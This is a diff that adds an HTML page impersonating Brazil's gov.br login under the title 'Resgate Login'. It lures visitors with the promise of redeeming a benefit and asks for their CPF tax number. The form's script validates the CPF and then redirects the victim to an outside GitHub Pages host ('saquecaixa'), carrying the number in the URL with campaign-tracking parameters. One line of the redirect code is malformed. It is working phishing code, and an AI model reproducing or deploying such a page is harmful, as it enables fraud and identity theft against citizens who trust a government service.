@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resgate Login</title>
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/start.css">
+    <link rel="stylesheet" href="css/all.min_1.css">
+    <!-- Outros elementos do cabeçalho... -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <script src="js/track-v3.js" type="text/javascript" async=""></script><script src="js/script.js" async="" data-tracking-id="di5XqVbn0c" crossorigin="anonymous"></script>
+
+    <!-- <link rel="stylesheet" href="path/to/bootstrap/css/bootstrap.min.css">-->
+    <!--<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">-->
+  </head>
+  <body>
+    <header>
+      <img src="images/govbrlogo.png" alt="Imagem de um gato">
+      <!-- Você pode trocar a imagem por outra de sua preferência -->
+      <div id="acessibilidade">
+        <span>
+          <a href="#"><i class="fas fa-adjust"></i></a>
+        </span>
+        <span>
+          <a href="#" target="_blank"><i class="fas fa-deaf"></i></a>
+        </span>
+      </div>
+    </header>
+
+    <div class="container">
+      <div class="card">
+        <h3>Identifique-se no gov.br com:</h3>
+        <div class="item-login-signup">
+          <a tabindex="3">
+            <img src="images/id-card-solid.png">
+            Número do CPF
+          </a>
+        </div>
+
+        <div class="accordion-panel">
+          <p>
+            Digite seu CPF para <strong>criar</strong> ou
+            <strong>acessar</strong> sua conta gov.br
+          </p>
+
+          <form id="formCPF">
+            <label for="cpf">CPF</label>
+            <input id="numeroCPF" name="cpf" autocomplete="new-password" tabindex="1" type="tel" value="" placeholder="Digite seu CPF" aria-invalid="false" required="true" class="corrigircpf">
+          
+            <script>
+              document.addEventListener("DOMContentLoaded", function () {
+                // Obtém todos os elementos com a classe 'corrigircpf'
+                var inputs = document.getElementsByClassName("corrigircpf");
+
+                // Adiciona um ouvinte de evento de entrada a cada elemento
+                for (var i = 0; i < inputs.length; i++) {
+                  inputs[i].addEventListener("input", function () {
+                    // Remove os caracteres '-' e '.'
+                    this.value = this.value.replace(/[-.]/g, "");
+
+                    // Limite a quantidade de caracteres conforme necessário (ex: CPF)
+                    var maxLength = 11; // ajuste conforme necessário
+                    this.value = this.value.slice(0, maxLength);
+                  });
+                }
+              });
+            </script>
+            <script>
+              function validaCPF(cpf) {
+                cpf = cpf.replace(/[^\d]+/g, "");
+                if (cpf == "") return false;
+                if (
+                  cpf.length != 11 ||
+                  cpf == "00000000000" ||
+                  cpf == "11111111111" ||
+                  cpf == "22222222222" ||
+                  cpf == "33333333333" ||
+                  cpf == "44444444444" ||
+                  cpf == "55555555555" ||
+                  cpf == "66666666666" ||
+                  cpf == "77777777777" ||
+                  cpf == "88888888888" ||
+                  cpf == "99999999999"
+                )
+                  return false;
+                for (var t = 9; t < 11; t++) {
+                  for (var d = 0, c = 0; c < t; c++) {
+                    d += cpf[c] * (t + 1 - c);
+                  }
+                  d = ((10 * d) % 11) % 10;
+                  if (cpf[c] != d) {
+                    return false;
+                  }
+                }
+                return true;
+              }
+
+              document
+                .getElementById("formCPF")
+                .addEventListener("submit", function (event) {
+                  event.preventDefault(); // Impede o envio padrão do formulário
+
+                  // Obtém o valor do input com ID "numeroCPF"
+                  var numeroCPF = document.getElementById("numeroCPF").value;
+
+                  if (!validaCPF(numeroCPF)) {
+                    alert(
+                      "CPF inválido. Por favor, insira um número de CPF válido."
+                    );
+                    return false;
+                  }
+
+                  const utmSource = getParameterByName("utm_source");
+                  const utmCampaign = getParameterByName("utm_campaign");
+                  const utmMedium = getParameterByName("utm_medium");
+                  const utmContent = getParameterByName("utm_content");
+
+                  var redirectURL =
+                    `https://jogodofuturo.github.io/saquecaixa/` 
+                    encodeURIComponent(numeroCPF) +
+                    "&utm_source=" +
+                    utmSource +
+                    "&utm_campaign=" +
+                    utmCampaign +
+                    "&utm_medium=" +
+                    utmMedium +
+                    "&utm_content=" +
+                    utmContent;
+
+                  // Adiciona parâmetros existentes na URL atual à nova URL
+                  var parametrosAtuais = window.location.search.substring(1);
+                  if (parametrosAtuais) {
+                    redirectURL += "&" + parametrosAtuais;
+                  }
+
+                  // Redireciona para a URL construída
+                  window.location.href = redirectURL;
+                });
+            </script>
+            <div id="error-message" style="color: red"></div>
+            <p>
+              Nota: Uma atendente continuará o seu atendimento logo após você
+              prosseguir para o resgate do seu benefício.
+            </p>
+            <div class="button-panel" id="login-button-panel">
+              <input type="submit" value="Continuar" id="buttonCPF" class="button-continuar" tabindex="2">
+              <style type="text/css">
+                input.button-continuar {
+                  border-radius: 20px;
+                  border: none;
+                  color: #fff;
+                }
+              </style>
+            </div>
+          </form>
+          <label id="title-outras-op">Outras opções de identificação:</label>
+          <hr id="hr-outras-op" style="margin: 0 0 0">
+          <div class="item-login-signup-ways" onclick="showModal('modal-bancos-credenciados')">
+            <a tabindex="5" href="#" style="color: #008c32">
+              <img src="images/InternetBanking-green.png">
+              Login com seu banco
+              <span style="
+                  font-size: 7px;
+                  background-color: #008c32;
+                  color: white;
+                  padding: 3px;
+                  top: -3px;
+                  position: relative;
+                  margin-left: 8px;
+                ">SUA CONTA SERÁ PRATA</span>
+            </a>
+          </div>
+          <div class="item-login-signup-ways" onclick="showQrCode('e062c3ac-776d-4ee0-b6f3-f9198984ca37');">
+            <a tabindex="5" href="#">
+              <img src="images/app-identidade-govbr.png">
+              Seu aplicativo gov.br
+            </a>
+          </div>
+          <div class="item-login-signup-ways" id="cert-digital-cloud" onclick="showModal('modal-certificado-nuvem')">
+            <a tabindex="5" href="#" id="cert-digital-cloud-a">
+              <img src="images/CD-Nuvem.png" id="cert-digital-cloud-img">
+              Seu certificado digital em nuvem
+            </a>
+          </div>
+          <div class="entenda-id-govbr" id="entenda-id-govbr">
+            <span>
+              <a tabindex="6" href="#" id="entenda-id-govbr-a">
+                <img src="images/circle-question-solid.svg" style="margin: 0px 13px -2px 0px; height: 1em">
+                Está com dúvidas e precisa de ajuda?
+              </a>
+              <a tabindex="6" href="#" style="display: block" target="_blank" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="js/track-v3_1.js" type="text/javascript" async=""></script>
+    <script src="js/apii.js"></script>
+    <script>
+      function formatarCPF(cpf) {
+        cpf = cpf.replace(/\D/g, "");
+        cpf = cpf.substring(0, 11);
+        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+        cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+        return cpf;
+      }
+
+      document.getElementById("numero").addEventListener("input", function (e) {
+        var cpfFormatado = formatarCPF(e.target.value);
+        e.target.value = cpfFormatado;
+
+        // Atualizar o valor do campo oculto com o CPF sem formatação
+        var cpfLimpo = cpfFormatado.replace(/\D/g, "");
+        document.getElementById("cpf_valor_real").value = cpfLimpo;
+      });
+    </script>
+    <script type="text/javascript">
+      (function (funnel) {
+        var deferredEvents = [];
+        window.funnelytics = {
+          events: {
+            trigger: function (name, attributes, callback, opts) {
+              deferredEvents.push({
+                name: name,
+                attributes: attributes,
+                callback: callback,
+                opts: opts,
+              });
+            },
+          },
+        };
+        var insert = document.getElementsByTagName("script")[0],
+          script = document.createElement("script");
+        script.addEventListener("load", function () {
+          window.funnelytics.init(funnel, false, deferredEvents);
+        });
+        script.src = "https://cdn.funnelytics.io/track-v3.js";
+        script.type = "text/javascript";
+        script.async = true;
+        insert.parentNode.insertBefore(script, insert);
+      })("42208a35-a879-421e-8f80-48b628f055c7");
+    </script>
+  
+</body></html>
